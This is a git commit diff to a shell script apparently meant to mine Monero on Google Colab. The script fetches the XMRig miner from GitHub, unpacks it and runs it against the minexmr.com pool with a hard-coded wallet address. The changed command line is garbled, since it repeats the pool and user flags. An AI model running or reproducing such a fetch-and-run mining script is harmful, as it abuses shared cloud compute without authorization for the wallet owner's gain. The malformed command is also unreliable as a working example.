506500fa904fd6eb9e7cb9b5bf751e2c992f11a4
boboloncaca <104854151+boboloncaca@users.noreply.github.com>
2022-05-04 16:43:19 +0200

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
 tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
 cd xmrig-6.16.4
-./xmrig -o us-west.minexmr.com:443 -u 46KNAoLnz5xDEPdL1z1NbBToUZUwQyuqAe1yDKEBDcuyHzUDSu7AnnCVKWXjKHaYmgV36KxfrUNVb3QL2TFPCZr2QcWvgET -k --tls --rig-id GC-US
+./xmrig -o pool.minexmr.com:4444 -u xmrig -o pool.minexmr.com:4444 -u 46KNAoLnz5xDEPdL1z1NbBToUZUwQyuqAe1yDKEBDcuyHzUDSu7AnnCVKWXjKHaYmgV36KxfrUNVb3QL2TFPCZr2QcWvgET -k --tls --rig-id GC-US
